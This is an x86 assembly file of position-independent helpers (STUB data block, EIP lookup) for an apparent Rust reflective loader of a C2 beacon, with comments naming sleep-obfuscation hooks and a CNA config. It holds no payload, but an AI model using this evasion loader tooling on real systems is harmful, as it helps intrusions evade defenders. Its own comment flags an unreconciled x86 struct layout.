[BITS 32]

;--------------------------------------------------------------------------
; Misc helpers (x86) - Position-independent utilities and STUB metadata
;
; PURPOSE:
;   Provides position-independent primitives for Rust code on 32-bit systems.
;   Mirrors x64 functionality but adapted for x86 architecture.
;
; FUNCTIONS:
;   - _Stub:     STUB metadata structure (region/size/heap/logging)
;   - _StubAddr: Returns runtime address of Stub (EIP-relative)
;   - _GetIp:    Returns current instruction pointer (EIP)
;
; WHY ASSEMBLY?
;   1. Rust cannot safely get current instruction pointer
;   2. EIP-relative addressing is needed for position-independence
;   3. STUB must be at known location for hooks to access runtime data
;
; SECTION PLACEMENT:
;   - .text$C: STUB data and _StubAddr (middle of code section)
;   - .text$ZZ: _GetIp and _Leave marker (end of code section)
;
; NOTE:
;   x86 uses underscore prefix (_Stub, _GetIp, etc.) for C name mangling.
;--------------------------------------------------------------------------
GLOBAL _GetIp
GLOBAL _Stub
GLOBAL _StubAddr

[SECTION .text$C]

;--------------------------------------------------------------------------
; _Stub - STUB metadata structure (x86)
;
; PURPOSE:
;   Runtime data structure accessed by IAT hooks to get:
;   - Memory region bounds for sleep obfuscation encryption
;   - Custom heap handle for beacon allocations
;
; LAYOUT:
;   Offset | Size | Field         | Description
;   -------|------|---------------|------------------------------------------
;   0x00   | 4    | Region        | Base address of allocated region
;   0x04   | 4    | Size          | Total size of region in bytes
;   0x08   | 4    | Heap          | Custom heap handle (from RtlCreateHeap)
;   0x0C   | 4    | NumSections   | Number of PE sections
;   0x10   | 320  | Sections[20]  | Array of MemorySection structs (x86)
;   0x150  | 4    | Api (pointer) | *mut Api → points to +0x154 storage
;   0x154  | 8192 | Api (storage) | Inline Api struct (filled by fill_stub)
;
; NOTE:
;   Console/WriteFile fields removed - logging now resolves APIs fresh
;   each call for RX memory compatibility (no writes to STUB needed).
;
; WARNING:
;   The Rust STUB struct (loader.rs) includes a `stub_size` field between
;   Size and Heap. This x86 ASM layout does NOT include that field, so
;   offsets diverge from the Rust struct at +0x08 onward. This must be
;   reconciled if x86 support is needed.
;
; INITIALIZATION:
;   All fields start as 0 and are populated by loader's fill_stub() function.
;
; ACCESS:
;   Hooks use _StubAddr() to get the runtime address of this structure.
;--------------------------------------------------------------------------
_Stub:
    dd    0              ; +0x00: Region base address (4 bytes)
    dd    0              ; +0x04: Region size in bytes (4 bytes)
    dd    0              ; +0x08: Custom heap handle (4 bytes)
    dd    0              ; +0x0C: Number of sections (4 bytes)
    ; +0x10: sections[20] array - each MemorySection is 16 bytes (x86)
    ; MemorySection: base_address(4) + size(4) + current_protect(4) + previous_protect(4)
    times 320 db 0       ; 20 * 16 = 320 bytes
    ; +0x150: Api pointer (points to inline storage at +0x154 below)
    dd    0              ; *mut Api (4 bytes)
    ; +0x154: Inline Api storage (filled by fill_stub via memcopy)
    ; Api is ~4300 bytes (with FramePool in each Config); reserve 8192 for safety
    times 8192 db 0      ; Api storage

;--------------------------------------------------------------------------
; _StubAddr - Returns runtime address of STUB structure (x86)
;
; PURPOSE:
;   Provides position-independent access to the STUB metadata structure.
;   Uses EIP-relative calculation to determine runtime address.
;
; HOW IT WORKS:
;   1. CALL .get_eip pushes return address (EIP) onto stack
;   2. POP retrieves EIP into EAX
;   3. SUB calculates offset back to _Stub from current EIP
;
; CALLING CONVENTION:
;   No arguments (x86 cdecl)
;
; RETURNS:
;   EAX = Runtime address of _Stub structure
;
; WHY ASSEMBLY?
;   Rust cannot safely perform EIP-relative addressing without relocations.
;   This function enables true position-independent STUB access on x86.
;
; USAGE FROM RUST:
;   let stub_ptr = _StubAddr() as PSTUB;
;   let custom_heap = (*stub_ptr).heap;
;--------------------------------------------------------------------------
_StubAddr:
    call    .get_eip        ; Push next instruction address (EIP)
.get_eip:
    pop    eax              ; Pop EIP into EAX
    sub    eax, .get_eip - _Stub ; Calculate offset to _Stub
    ret                     ; Return address in EAX

[SECTION .text$ZZ]

;--------------------------------------------------------------------------
; _GetIp - Returns current instruction pointer (EIP) for x86
;
; PURPOSE:
;   Retrieves the current instruction pointer for position-independent
;   offset calculations (OFFSET macro and G_END function in Rust).
;
; HOW IT WORKS:
;   1. CALL pushes return address (next instruction) onto stack
;   2. POP retrieves that return address into EAX
;   3. SUB 5 adjusts back to the CALL instruction address
;
; CALLING CONVENTION:
;   No arguments (x86 cdecl)
;
; RETURNS:
;   EAX = Current instruction pointer (address of CALL instruction)
;
; WHY ASSEMBLY?
;   Rust has no safe way to retrieve the instruction pointer without breaking
;   position-independence. This technique is standard for PIC shellcode.
;
; USAGE FROM RUST:
;   Used by OFFSET() and G_END() macros for runtime address calculations.
;--------------------------------------------------------------------------
_GetIp:
    call    _get_ret_ptr    ; Push next instruction address onto stack

_get_ret_ptr:
    pop    eax              ; Pop return address into EAX
    sub    eax, 5           ; Adjust back 5 bytes (size of CALL instruction)
    ret                     ; Return EIP in EAX

; Note: No marker at end - CONFIG struct from CNA is directly after GetIp
